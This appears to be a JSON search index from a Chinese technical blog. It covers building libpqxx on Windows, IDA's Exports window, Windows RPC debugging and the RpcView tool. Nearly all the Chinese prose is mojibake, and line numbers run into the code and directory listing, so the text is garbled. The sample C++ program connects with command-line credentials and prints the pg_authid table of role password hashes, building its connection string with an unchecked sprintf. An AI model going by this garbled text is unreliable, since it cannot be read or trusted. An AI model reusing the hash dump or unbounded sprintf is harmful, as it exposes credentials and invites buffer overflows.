/LARGEADDRESSAWAREï¼Œåˆ™ DUMPBIN /HEADERS å°†æ˜¾ç¤ºè¯¥æ•ˆæœçš„ä¿¡æ¯ã€‚","tags":[{"name":"windows/visual-studio","slug":"windows-visual-studio","permalink":"https://hodlyounger.github.io/tags/windows-visual-studio/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"ã€PostgreSQLã€‘windowsä¸‹ç¼–è¯‘pqxx","date":"2023-11-16T06:40:46.281Z","path":"C_OpenSource/ã€PostgreSQLã€‘pqxx ç¼–è¯‘/","text":"æ¦‚è¿°ï¼šwindowsä¸‹ç¼–è¯‘libpq ğŸ¡ æ³¨æ„1ï¼šPostgreSQL ä»ç‰ˆæœ¬10ä¹‹åå°±åªæœ‰64ä½äº†ã€‚ä½¿ç”¨pqxxä¹Ÿä¸ç”¨è€ƒè™‘32ä½ ä½¿ç”¨ç‰ˆæœ¬è¯´æ˜ï¼š PostGreSQL: 16.1 pqxx: 7.7.6 ğŸ¡ æ³¨æ„2: pqxx ä½¿ç”¨çš„æ˜¯ C++17 0x01 å‰è¨€ what: The official C++ client API for PostgreSQL. 0x02 ä¸‹è½½æºç  postgresqläºŒè¿›åˆ¶æ–‡ä»¶ä¸‹è½½é“¾æ¥ Community DL Page pqxx jtv/libpqxx at 7.7 æºç ä»“åº“æä¾›äº†windowsä¸‹å¿«é€Ÿç¼–è¯‘libpqçš„æ–¹æ³•ã€‚ä½†ä¸å¥½ç”¨ï¼Œæœ¬äººå°è¯•ä½†æœªèƒ½æˆåŠŸã€‚ Easy-PQXX-Build-for-Windows-Visual-Studio GordonLElliott/Easy-PQXX-Build-for-Windows-Visual-Studio: Quickly build libpqxx, the official C++ client API for PostgreSQL, in Windows environment with Visual Studio. Create both Debug and Release configurations with optional efficiency patches, install in Program Files directory, create property sheets to easily use in Visual Studio applications, with named versions for configurations, and options. 0x03 ä½¿ç”¨ cmake ç¼–è¯‘ pqxx ç¼–è¯‘ ç¼–è¯‘ pqxx éœ€è¦ PostGreSQL çš„è¿è¡Œç¯å¢ƒï¼Œå› æ­¤éœ€è¦ä¸‹è½½äºŒè¿›åˆ¶åŒ…æ‰èƒ½ç¼–è¯‘æˆåŠŸã€‚å» PostgreSQL å®˜ç½‘ä¸‹è½½å®‰è£…åŒ…æˆ–è€…äºŒè¿›åˆ¶åŒ…éƒ½å¯ä»¥ã€‚ ä¸‹è½½å®Œæˆåï¼Œåˆ†ä¸¤ç§æƒ…å†µï¼Œå¦‚æœæ˜¯ä¸‹è½½çš„å®‰è£…åŒ…ï¼Œå®‰è£… postgresql åç›´æ¥ç”¨ cmake ç¼–è¯‘å°±å¯ä»¥äº†ï¼Œå¦‚æœä¸‹è½½çš„æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåˆ™éœ€è¦é…ç½®cmakeçš„å˜é‡å¦‚ä¸‹æ‰€ç¤ºï¼Œç›´æ¥ä¿®æ”¹æ ¹ç›®å½•çš„ CMakeLists.txt 1234567891011121314151617181920cmake_minimum_required(VERSION 3.8)file(READ VERSION VER_FILE_CONTENT)string(STRIP $&#123;VER_FILE_CONTENT&#125; VER_FILE_CONTENT)project( libpqxx VERSION $&#123;VER_FILE_CONTENT&#125; LANGUAGES CXX)# åœ¨è¿™é‡Œå£°æ˜ postgresql çš„äºŒè¿›åˆ¶æ ¹ç›®å½•ï¼Œæ ¹æ®ä¸ªäººä¸‹æƒ…å†µé…ç½®å³å¯set(PostgreSQL_ROOT &quot;D:\\\\Documents\\\\postgresql\\\\postgresql-16.1-1-windows-x64-binaries\\\\pgsql&quot;)if(NOT &quot;$&#123;CMAKE_CXX_STANDARD&#125;&quot;) set(CMAKE_CXX_STANDARD 17)endif()set(CMAKE_CXX_STANDARD_REQUIRED ON)set(CMAKE_CXX_EXTENSIONS OFF)set(CMAKE_MODULE_PATH $&#123;PROJECT_SOURCE_DIR&#125;/cmake) ç„¶åå°±æ˜¯ä½¿ç”¨ cmake ç¼–è¯‘äº†ï¼Œç›®å‰ VSCode å’Œ Visual Studio éƒ½æ”¯æŒ CMake æ–‡ä»¶çš„ç¼–è¯‘ï¼Œç›´æ¥ç¼–è¯‘å³å¯ã€‚ è¿™é‡Œä½¿ç”¨ Visual Studio ç¼–è¯‘åï¼Œä¼šåœ¨ out ç›®å½•ä¸‹ç”Ÿæˆlibæ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363D:\\Documents\\A_Source\\OpenSource\\libpqxx\\out&gt;tree /Få· æœ¬åœ°ç£ç›˜ çš„æ–‡ä»¶å¤¹ PATH åˆ—è¡¨å·åºåˆ—å·ä¸º 724D-690ED:.â”œâ”€buildâ”‚ â””â”€x64-Debugâ”‚ â”‚ .ninja_depsâ”‚ â”‚ .ninja_logâ”‚ â”‚ build.ninjaâ”‚ â”‚ CMakeCache.txtâ”‚ â”‚ cmake_install.cmakeâ”‚ â”‚ CPackConfig.cmakeâ”‚ â”‚ CPackSourceConfig.cmakeâ”‚ â”‚ install_manifest.txtâ”‚ â”‚ libpqxx-config-version.cmakeâ”‚ â”‚ libpqxx-config.cmakeâ”‚ â”‚ libpqxx-targets.cmakeâ”‚ â”‚ libpqxx.pcâ”‚ â”‚ VSInheritEnvironments.txtâ”‚ â”‚â”‚ â”œâ”€.cmakeâ”‚ â”‚ â””â”€apiâ”‚ â”‚ â””â”€v1â”‚ â”‚ â”œâ”€queryâ”‚ â”‚ â”‚ â””â”€client-MicrosoftVSâ”‚ â”‚ â”‚ query.jsonâ”‚ â”‚ â”‚â”‚ â”‚ â””â”€replyâ”‚ â”‚ cache-v2-4c1f3ae5d14ffd09e2dd.jsonâ”‚ â”‚ cmakeFiles-v1-6f2def4807820d15719b.jsonâ”‚ â”‚ codemodel-v2-8933aef952d7508a3af3.jsonâ”‚ â”‚ directory-.-Debug-6b54e12c0d4bd01edfca.jsonâ”‚ â”‚ directory-include-Debug-ba96d77232f254970ce6.jsonâ”‚ â”‚ directory-src-Debug-5d1cc30954eb9bce3508.jsonâ”‚ â”‚ directory-test-Debug-f18be1977b403cfd1a50.jsonâ”‚ â”‚ index-2023-11-16T09-03-01-0309.jsonâ”‚ â”‚ target-pqxx-Debug-08c4b9d672ef282e41c8.jsonâ”‚ â”‚ target-runner-Debug-b625a8b78dd4666c4f11.jsonâ”‚ â”‚ toolchains-v1-3b995f712f6d6e9a85c1.jsonâ”‚ â”‚â”‚ â”œâ”€CMakeFilesâ”‚ â”‚ â”‚ cmake.check_cacheâ”‚ â”‚ â”‚ CMakeConfigureLog.yamlâ”‚ â”‚ â”‚ rules.ninjaâ”‚ â”‚ â”‚ TargetDirectories.txtâ”‚ â”‚ â”‚â”‚ â”‚ â”œâ”€3.26.4-msvc4â”‚ â”‚ â”‚ â”‚ CMakeCXXCompiler.cmakeâ”‚ â”‚ â”‚ â”‚ CMakeDetermineCompilerABI_CXX.binâ”‚ â”‚ â”‚ â”‚ CMakeRCCompiler.cmakeâ”‚ â”‚ â”‚ â”‚ CMakeSystem.cmakeâ”‚ â”‚ â”‚ â”‚â”‚ â”‚ â”‚ â””â”€CompilerIdCXXâ”‚ â”‚ â”‚ â”‚ CMakeCXXCompilerId.cppâ”‚ â”‚ â”‚ â”‚ CMakeCXXCompilerId.exeâ”‚ â”‚ â”‚ â”‚ CMakeCXXCompilerId.objâ”‚ â”‚ â”‚ â”‚â”‚ â”‚ â”‚ â””â”€tmpâ”‚ â”‚ â”œâ”€CMakeTmpâ”‚ â”‚ â”œâ”€Exportâ”‚ â”‚ â”‚ â””â”€d6b66e93f8212dd1f00debf9f6654819â”‚ â”‚ â”‚ libpqxx-targets-debug.cmakeâ”‚ â”‚ â”‚ libpqxx-targets.cmakeâ”‚ â”‚ â”‚â”‚ â”‚ â”œâ”€pkgRedirectsâ”‚ â”‚ â””â”€ShowIncludesâ”‚ â”‚ foo.hâ”‚ â”‚ main.câ”‚ â”‚ main.objâ”‚ â”‚â”‚ â”œâ”€includeâ”‚ â”‚ â”‚ cmake_install.cmakeâ”‚ â”‚ â”‚â”‚ â”‚ â”œâ”€CMakeFilesâ”‚ â”‚ â””â”€pqxxâ”‚ â”‚ config-internal-compiler.hâ”‚ â”‚ config-internal-libpq.hâ”‚ â”‚ config-public-compiler.hâ”‚ â”‚ config_cmake.h.inâ”‚ â”‚â”‚ â”œâ”€srcâ”‚ â”‚ â”‚ cmake_install.cmakeâ”‚ â”‚ â”‚ pqxx.libâ”‚ â”‚ â”‚â”‚ â”‚ â””â”€CMakeFilesâ”‚ â”‚ â””â”€pqxx.dirâ”‚ â”‚ array.cxx.objâ”‚ â”‚ binarystring.cxx.objâ”‚ â”‚ blob.cxx.objâ”‚ â”‚ connection.cxx.objâ”‚ â”‚ cursor.cxx.objâ”‚ â”‚ encodings.cxx.objâ”‚ â”‚ errorhandler.cxx.objâ”‚ â”‚ except.cxx.objâ”‚ â”‚ field.cxx.objâ”‚ â”‚ largeobject.cxx.objâ”‚ â”‚ notification.cxx.objâ”‚ â”‚ params.cxx.objâ”‚ â”‚ pipeline.cxx.objâ”‚ â”‚ pqxx.pdbâ”‚ â”‚ result.cxx.objâ”‚ â”‚ robusttransaction.cxx.objâ”‚ â”‚ row.cxx.objâ”‚ â”‚ sql_cursor.cxx.objâ”‚ â”‚ strconv.cxx.objâ”‚ â”‚ stream_from.cxx.objâ”‚ â”‚ stream_to.cxx.objâ”‚ â”‚ subtransaction.cxx.objâ”‚ â”‚ time.cxx.objâ”‚ â”‚ transaction.cxx.objâ”‚ â”‚ transaction_base.cxx.objâ”‚ â”‚ util.cxx.objâ”‚ â”‚ version.cxx.objâ”‚ â”‚ wait.cxx.objâ”‚ â”‚â”‚ â”œâ”€testâ”‚ â”‚ â”‚ cmake_install.cmakeâ”‚ â”‚ â”‚ CTestTestfile.cmakeâ”‚ â”‚ â”‚ runner.exeâ”‚ â”‚ â”‚ runner.ilkâ”‚ â”‚ â”‚ runner.pdbâ”‚ â”‚ â”‚â”‚ â”‚ â””â”€CMakeFilesâ”‚ â”‚ â””â”€runner.dirâ”‚ â”‚ â”‚ embed.manifestâ”‚ â”‚ â”‚ intermediate.manifestâ”‚ â”‚ â”‚ manifest.rcâ”‚ â”‚ â”‚ manifest.resâ”‚ â”‚ â”‚ runner.cxx.objâ”‚ â”‚ â”‚ test00.cxx.objâ”‚ â”‚ â”‚ test01.cxx.objâ”‚ â”‚ â”‚ test02.cxx.objâ”‚ â”‚ â”‚ test04.cxx.objâ”‚ â”‚ â”‚ test07.cxx.objâ”‚ â”‚ â”‚ test10.cxx.objâ”‚ â”‚ â”‚ test11.cxx.objâ”‚ â”‚ â”‚ test13.cxx.objâ”‚ â”‚ â”‚ test14.cxx.objâ”‚ â”‚ â”‚ test16.cxx.objâ”‚ â”‚ â”‚ test17.cxx.objâ”‚ â”‚ â”‚ test18.cxx.objâ”‚ â”‚ â”‚ test20.cxx.objâ”‚ â”‚ â”‚ test21.cxx.objâ”‚ â”‚ â”‚ test26.cxx.objâ”‚ â”‚ â”‚ test29.cxx.objâ”‚ â”‚ â”‚ test30.cxx.objâ”‚ â”‚ â”‚ test32.cxx.objâ”‚ â”‚ â”‚ test37.cxx.objâ”‚ â”‚ â”‚ test39.cxx.objâ”‚ â”‚ â”‚ test46.cxx.objâ”‚ â”‚ â”‚ test56.cxx.objâ”‚ â”‚ â”‚ test60.cxx.objâ”‚ â”‚ â”‚ test61.cxx.objâ”‚ â”‚ â”‚ test62.cxx.objâ”‚ â”‚ â”‚ test69.cxx.objâ”‚ â”‚ â”‚ test70.cxx.objâ”‚ â”‚ â”‚ test71.cxx.objâ”‚ â”‚ â”‚ test72.cxx.objâ”‚ â”‚ â”‚ test74.cxx.objâ”‚ â”‚ â”‚ test75.cxx.objâ”‚ â”‚ â”‚ test76.cxx.objâ”‚ â”‚ â”‚ test77.cxx.objâ”‚ â”‚ â”‚ test78.cxx.objâ”‚ â”‚ â”‚ test79.cxx.objâ”‚ â”‚ â”‚ test82.cxx.objâ”‚ â”‚ â”‚ test84.cxx.objâ”‚ â”‚ â”‚ test87.cxx.objâ”‚ â”‚ â”‚ test88.cxx.objâ”‚ â”‚ â”‚ test89.cxx.objâ”‚ â”‚ â”‚ test90.cxx.objâ”‚ â”‚ â”‚ vc140.pdbâ”‚ â”‚ â”‚â”‚ â”‚ â””â”€unitâ”‚ â”‚ test_array.cxx.objâ”‚ â”‚ test_binarystring.cxx.objâ”‚ â”‚ test_blob.cxx.objâ”‚ â”‚ test_cancel_query.cxx.objâ”‚ â”‚ test_column.cxx.objâ”‚ â”‚ test_composite.cxx.objâ”‚ â”‚ test_connection.cxx.objâ”‚ â”‚ test_cursor.cxx.objâ”‚ â”‚ test_encodings.cxx.objâ”‚ â”‚ test_errorhandler.cxx.objâ”‚ â”‚ test_error_verbosity.cxx.objâ”‚ â”‚ test_escape.cxx.objâ”‚ â”‚ test_exceptions.cxx.objâ”‚ â”‚ test_field.cxx.objâ”‚ â”‚ test_float.cxx.objâ”‚ â”‚ test_largeobject.cxx.objâ”‚ â”‚ test_nonblocking_connect.cxx.objâ”‚ â”‚ test_notification.cxx.objâ”‚ â”‚ test_pipeline.cxx.objâ”‚ â”‚ test_prepared_statement.cxx.objâ”‚ â”‚ test_range.cxx.objâ”‚ â”‚ test_read_transaction.cxx.objâ”‚ â”‚ test_result_iteration.cxx.objâ”‚ â”‚ test_result_slicing.cxx.objâ”‚ â”‚ test_row.cxx.objâ”‚ â”‚ test_separated_list.cxx.objâ”‚ â”‚ test_simultaneous_transactions.cxx.objâ”‚ â”‚ test_sql_cursor.cxx.objâ”‚ â”‚ test_stateless_cursor.cxx.objâ”‚ â”‚ test_strconv.cxx.objâ”‚ â”‚ test_stream_from.cxx.objâ”‚ â”‚ test_stream_to.cxx.objâ”‚ â”‚ test_string_conversion.cxx.objâ”‚ â”‚ test_subtransaction.cxx.objâ”‚ â”‚ test_test_helpers.cxx.objâ”‚ â”‚ test_thread_safety_model.cxx.objâ”‚ â”‚ test_time.cxx.objâ”‚ â”‚ test_transaction.cxx.objâ”‚ â”‚ test_transaction_base.cxx.objâ”‚ â”‚ test_transaction_focus.cxx.objâ”‚ â”‚ test_transactor.cxx.objâ”‚ â”‚ test_type_name.cxx.objâ”‚ â”‚ test_zview.cxx.objâ”‚ â”‚â”‚ â””â”€Testingâ”‚ â””â”€Temporaryâ”‚ LastTest.logâ”‚â””â”€install â””â”€x64-Debug â”œâ”€include â”‚ â””â”€pqxx â”‚ â”‚ array â”‚ â”‚ array.hxx â”‚ â”‚ binarystring â”‚ â”‚ binarystring.hxx â”‚ â”‚ blob â”‚ â”‚ blob.hxx â”‚ â”‚ composite â”‚ â”‚ composite.hxx â”‚ â”‚ config-public-compiler.h â”‚ â”‚ connection â”‚ â”‚ connection.hxx â”‚ â”‚ cursor â”‚ â”‚ cursor.hxx â”‚ â”‚ dbtransaction â”‚ â”‚ dbtransaction.hxx â”‚ â”‚ errorhandler â”‚ â”‚ errorhandler.hxx â”‚ â”‚ except â”‚ â”‚ except.hxx â”‚ â”‚ field â”‚ â”‚ field.hxx â”‚ â”‚ isolation â”‚ â”‚ isolation.hxx â”‚ â”‚ largeobject â”‚ â”‚ largeobject.hxx â”‚ â”‚ nontransaction â”‚ â”‚ nontransaction.hxx â”‚ â”‚ notification â”‚ â”‚ notification.hxx â”‚ â”‚ params â”‚ â”‚ params.hxx â”‚ â”‚ pipeline â”‚ â”‚ pipeline.hxx â”‚ â”‚ pqxx â”‚ â”‚ prepared_statement â”‚ â”‚ prepared_statement.hxx â”‚ â”‚ range â”‚ â”‚ range.hxx â”‚ â”‚ result â”‚ â”‚ result.hxx â”‚ â”‚ robusttransaction â”‚ â”‚ robusttransaction.hxx â”‚ â”‚ row â”‚ â”‚ row.hxx â”‚ â”‚ separated_list â”‚ â”‚ separated_list.hxx â”‚ â”‚ strconv â”‚ â”‚ strconv.hxx â”‚ â”‚ stream_from â”‚ â”‚ stream_from.hxx â”‚ â”‚ stream_to â”‚ â”‚ stream_to.hxx â”‚ â”‚ subtransaction â”‚ â”‚ subtransaction.hxx â”‚ â”‚ time â”‚ â”‚ time.hxx â”‚ â”‚ transaction â”‚ â”‚ transaction.hxx â”‚ â”‚ transaction_base â”‚ â”‚ transaction_base.hxx â”‚ â”‚ transaction_focus â”‚ â”‚ transaction_focus.hxx â”‚ â”‚ transactor â”‚ â”‚ transactor.hxx â”‚ â”‚ types â”‚ â”‚ types.hxx â”‚ â”‚ util â”‚ â”‚ util.hxx â”‚ â”‚ version â”‚ â”‚ version.hxx â”‚ â”‚ zview â”‚ â”‚ zview.hxx â”‚ â”‚ â”‚ â””â”€internal â”‚ â”‚ array-composite.hxx â”‚ â”‚ callgate.hxx â”‚ â”‚ concat.hxx â”‚ â”‚ conversions.hxx â”‚ â”‚ encodings.hxx â”‚ â”‚ encoding_group.hxx â”‚ â”‚ header-post.hxx â”‚ â”‚ header-pre.hxx â”‚ â”‚ ignore-deprecated-post.hxx â”‚ â”‚ ignore-deprecated-pre.hxx â”‚ â”‚ libpq-forward.hxx â”‚ â”‚ result_iter.hxx â”‚ â”‚ result_iterator.hxx â”‚ â”‚ sql_cursor.hxx â”‚ â”‚ statement_parameters.hxx â”‚ â”‚ stream_iterator.hxx â”‚ â”‚ wait.hxx â”‚ â”‚ â”‚ â””â”€gates â”‚ connection-errorhandler.hxx â”‚ connection-largeobject.hxx â”‚ connection-notification_receiver.hxx â”‚ connection-pipeline.hxx â”‚ connection-sql_cursor.hxx â”‚ connection-stream_from.hxx â”‚ connection-stream_to.hxx â”‚ connection-transaction.hxx â”‚ errorhandler-connection.hxx â”‚ icursorstream-icursor_iterator.hxx â”‚ icursor_iterator-icursorstream.hxx â”‚ result-connection.hxx â”‚ result-creation.hxx â”‚ result-pipeline.hxx â”‚ result-sql_cursor.hxx â”‚ transaction-sql_cursor.hxx â”‚ transaction-transaction_focus.hxx â”‚ â”œâ”€lib â”‚ â”‚ pqxx.lib â”‚ â”‚ â”‚ â”œâ”€cmake â”‚ â”‚ â””â”€libpqxx â”‚ â”‚ libpqxx-config-version.cmake â”‚ â”‚ libpqxx-config.cmake â”‚ â”‚ libpqxx-targets-debug.cmake â”‚ â”‚ libpqxx-targets.cmake â”‚ â”‚ â”‚ â””â”€pkgconfig â”‚ libpqxx.pc â”‚ â””â”€share â””â”€doc â””â”€libpqxx accessing-results.md binary-data.md datatypes.md escaping.md getting-started.md mainpage.md parameters.md performance.md prepared-statement.md streams.md thread-safety.md âš  ç„¶åå°±å¯ä»¥ç¼–ä»£ç ä½¿ç”¨ pqxx.lib äº†ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨ç¼–è¯‘é¡¹ç›®æ—¶è¿˜éœ€è¦æ·»åŠ  libpq.lib. é™¤æ­¤ä¹‹å¤–å¯ä»¥çœ‹åˆ°ä»¥ä¸‹ä¸¤ä¸ªç›®å½•ï¼Œè¿™ä¸¤ä¸ªç›®å½•å¾…ä¼šè¦å¼•å…¥åˆ° VS å·¥ç¨‹ä¸­ï¼š includeï¼šD:\\Documents\\A_Source\\OpenSource\\libpqxx\\out\\install\\x64-Debug\\include lib: D:\\Documents\\A_Source\\OpenSource\\libpqxx\\out\\install\\x64-Debug\\lib è¿˜éœ€å¼•å…¥ libpq.lib çš„ç›®å½•ã€‚ ä½¿ç”¨ ä»¥ä¸‹ä»£ç å¯ç›´æ¥ä½¿ç”¨ï¼Œè‡ªæµ‹æ˜¯æ²¡é—®é¢˜çš„ã€‚ å¦‚æœæœ‰ç¼–è¯‘æŠ¥é”™ C4996: '_Header_ciso646'ï¼Œå…³é—­ SDLæ£€æŸ¥ å†ç¼–è¯‘è¯•è¯•ã€‚ å¦å¤–è¡¥å……ä¸€ç‚¹ï¼Œç¼–è¯‘çš„PEæ–‡ä»¶è¿è¡Œæ—¶ä¾èµ–å¾ˆå¤šdllï¼ŒåŒ…æ‹¬ä½†ä¸é™äº libpq.dllã€libssl ç­‰ï¼Œå¯ä»¥é€‰æ‹©éƒ¨ç½²åˆ°å¦å¤–ä¸€å°æœºå™¨ä¸Šï¼ŒåŒæ—¶éƒ¨ç½² C++ è¿è¡Œæ—¶æ–‡ä»¶ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;pqxx/pqxx&gt;#include &lt;pqxx/transaction&gt;int main(int argc, char* argv[])&#123; // (Normally you&#x27;d check for valid command-line arguments.) if (argc &lt; 3) &#123; printf(&quot;Usage:\\n %s &lt;username&gt; &lt;password&gt;&quot;, argv[0]); exit(-1); &#125; char conn[MAX_PATH]; sprintf(conn, &quot;postgresql://%s:%s@localhost/postgres&quot;, argv[1], argv[2]); try &#123; pqxx::connection c&#123; conn &#125;; pqxx::work txn&#123; c &#125;; // For querying just one single value, the transaction has a shorthand method // query_value(). // // Use txn.quote() to escape and quote a C++ string for use as an SQL string // in a query&#x27;s text. pqxx::result res = txn.exec(&quot;SELECT * FROM pg_authid&quot;); for (int i = 0; i &lt; res.size(); i++) &#123; for(int j = 0; j &lt; res[i].size(); j++) std::cout &lt;&lt; &quot;&quot; &lt;&lt; res[i].at(j) &lt;&lt; &#x27;\\t&#x27;; std::cout &lt;&lt; &#x27;\\n&#x27;; &#125; &#125; catch (std::bad_alloc const&amp;) &#123; std::cerr &lt;&lt; &quot;Out of memory!&quot; &lt;&lt; std::endl; &#125; catch (pqxx::sql_error const&amp; e) &#123; std::cerr &lt;&lt; &quot;SQL error: &quot; &lt;&lt; e.what() &lt;&lt; std::endl &lt;&lt; &quot;Query was: &quot; &lt;&lt; e.query() &lt;&lt; std::endl; &#125; catch (std::exception const&amp; e) &#123; std::cerr &lt;&lt; &quot;Exception: &quot; &lt;&lt; e.what() &lt;&lt; std::endl; &#125; catch (...) &#123; std::cerr &lt;&lt; &quot;Unknown exception&quot; &lt;&lt; std::endl; &#125;&#125; åœ¨å®‰è£…postgresqlçš„æœºå™¨ä¸Šè¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š","tags":[{"name":"OpenSource","slug":"OpenSource","permalink":"https://hodlyounger.github.io/tags/OpenSource/"},{"name":"libpq","slug":"libpq","permalink":"https://hodlyounger.github.io/tags/libpq/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/"}]},{"title":"ã€å·¥å…·ã€‘IDA ä½¿ç”¨è¯¦è®°","date":"2023-11-08T16:00:00.000Z","path":"G_å·¥å…·/ã€å·¥å…·ã€‘IDA ä½¿ç”¨è¯¦è®°/","text":"Exports çª—å£ Exports çª—å£å±•ç¤ºäº†å½“å‰ PE æ–‡ä»¶çš„å¯¼å‡ºæ¥å£ä¿¡æ¯ã€‚ åœ¨IDA Proçš„Exportsçª—å£ä¸­ï¼Œæ¯ä¸ªå‡½æ•°åç§°æ—è¾¹çš„å­—æ¯å¯èƒ½æœ‰å¤šç§å«ä¹‰ï¼Œå…·ä½“å–å†³äºå‡½æ•°çš„å±æ€§ã€‚ åœ¨Exportsçª—å£ä¸­ï¼Œé€šå¸¸ä¼šçœ‹åˆ°ä»¥ä¸‹å‡ ç§å­—æ¯æ ‡è¯†ï¼š â€œIâ€ï¼šè¡¨ç¤ºè¯¥å‡½æ•°æ˜¯å¯¼å…¥çš„ï¼ˆImportedï¼‰ã€‚è¿™é€šå¸¸æ„å‘³ç€è¿™ä¸ªå‡½æ•°æ˜¯ç”±å¦ä¸€ä¸ªæ¨¡å—æä¾›çš„ï¼Œè€Œä¸æ˜¯å½“å‰åˆ†æçš„æ¨¡å—ã€‚å¯¼å…¥çš„å‡½æ•°é€šå¸¸åœ¨è°ƒç”¨å…¶ä»–æ¨¡å—çš„å‡½æ•°æ—¶ä½¿ç”¨ã€‚ â€œDâ€ï¼šè¡¨ç¤ºè¯¥å‡½æ•°æ˜¯å¯¼å‡ºçš„ï¼ˆDeclaredï¼‰ã€‚è¿™é€šå¸¸æ„å‘³ç€è¯¥å‡½æ•°æ˜¯å½“å‰æ¨¡å—å£°æ˜çš„ï¼Œä½†å¹¶æœªå®ç°ã€‚å¯¼å‡ºçš„å‡½æ•°é€šå¸¸æ˜¯ä¸ºäº†å…è®¸å…¶ä»–æ¨¡å—é€šè¿‡åç§°é“¾æ¥ï¼ˆname manglingï¼‰æ¥è°ƒç”¨å®ƒä»¬ã€‚ â€œFâ€ï¼šè¡¨ç¤ºè¯¥å‡½æ•°æ˜¯å·²å®šä¹‰çš„ï¼ˆDefinedï¼‰ã€‚è¿™é€šå¸¸æ„å‘³ç€è¯¥å‡½æ•°åœ¨å½“å‰çš„æ¨¡å—ä¸­å·²ç»å®ç°ã€‚","tags":[{"name":"Tools","slug":"Tools","permalink":"https://hodlyounger.github.io/tags/Tools/"},{"name":"IDA","slug":"IDA","permalink":"https://hodlyounger.github.io/tags/IDA/"}],"categories":[{"name":"G_å·¥å…·","slug":"G-å·¥å…·","permalink":"https://hodlyounger.github.io/categories/G-%E5%B7%A5%E5%85%B7/"}]},{"title":"ã€è°ƒè¯•æŠ€æœ¯ã€‘RPC","date":"2023-11-07T16:00:00.000Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘RPC/","text":"æ¦‚è¿°ï¼šwindwos RPC è°ƒè¯•è®°å½• ç›¸å…³æ–‡ç« ï¼š ã€RPCã€‘Tools ã€RPCã€‘ALPC ã€RPCã€‘æ¼æ´ ã€RPCã€‘RpcView ç›¸å…³ å‰è¨€ windows RPC æ˜¯å¸¸ç”¨çš„è¿œç¨‹è°ƒç”¨ï¼Œæœ‰å…³ rpc çš„ä½¿ç”¨å¯ä»¥åœ¨åšå®¢ä¸­æœç´¢RPCå…³é”®å­—æŸ¥çœ‹ç›¸å…³ä½¿ç”¨ã€‚RPCå·¥å…·ä¹Ÿå¯ä»¥ä½¿ç”¨å¼€æº RPCViewã€‚ RPCåŠç›¸å…³å·¥å…· å¯ä»¥çœ‹åˆ° RpcView å¯ä»¥çœ‹åˆ° RPC è¿›ç¨‹ä½¿ç”¨çš„åè®® ncacn_np ï¼Œä»¥åŠ ncacn_np åè®®å¯¹åº”çš„ç®¡é“å \\\\pipe\\\\helloã€‚é‚£æœ¬æ¬¡è°ƒè¯•çš„ç›®æ ‡å°±æ˜¯å¯¹æ ‡ RpcViewã€‚åœ¨ windbg ä¸­å¯ä»¥æŸ¥çœ‹ä¸€ä¸ªè¿›ç¨‹RPCè¯¦ç»†è¯¦ç»†ã€‚ è°ƒè¯•æ­¥éª¤ rpcè°ƒè¯•ä¸»è¦ç”¨åˆ°çš„ windows kits ä¸­å¸¦çš„æ–‡ä»¶ dbgrpc.exeã€‚è¯¦è§å¾®è½¯å®˜æ–¹æ–‡æ¡£ ä½¿ç”¨ DbgRpc å·¥å…· - Windows drivers | Microsoft Learn ç›¸å…³å‘½ä»¤åŠè¾“å‡ºè¯´æ˜","tags":[{"name":"è°ƒè¯•æŠ€æœ¯","slug":"è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/tags/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"},{"name":"RPC","slug":"RPC","permalink":"https://hodlyounger.github.io/tags/RPC/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€RPCã€‘RpcViewæ˜¯å¦‚ä½•æ£€æµ‹çš„","date":"2023-11-07T16:00:00.000Z","path":"A_OS/Windows/RPC/ã€RPCã€‘RpcView ç›¸å…³/","text":"æ¦‚è¿°ï¼šRpcView ä»£ç å­¦ä¹ åŠæ‰«æé€»è¾‘æ•´ç† 0x01 RpcView ä»£ç å­¦ä¹  silverf0x/RpcView: RpcView is a free tool to explore and decompile Microsoft RPC interfacesã€‚ RpcView æ˜¯ä¸€æ¬¾å¼€æºçš„ Windows RPC ç›‘æ§å·¥å…·ã€‚ç•Œé¢éƒ¨åˆ†æ˜¯ç”¨Qtå®ç°çš„ï¼ŒåŠŸèƒ½æ˜¯C\\C++å†™çš„ï¼ŒåŠŸèƒ½éƒ¨åˆ†æ¶‰åŠåˆ°æšä¸¾ç³»ç»Ÿçš„rpcå¹¶ä¸”è¿˜å®ç°äº†rpcçš„åæ±‡ç¼–ã€‚ä¸ç®¡æ˜¯è¦ç ”ç©¶ RPC è¿˜æ˜¯å­¦ä¹ ä»£ç 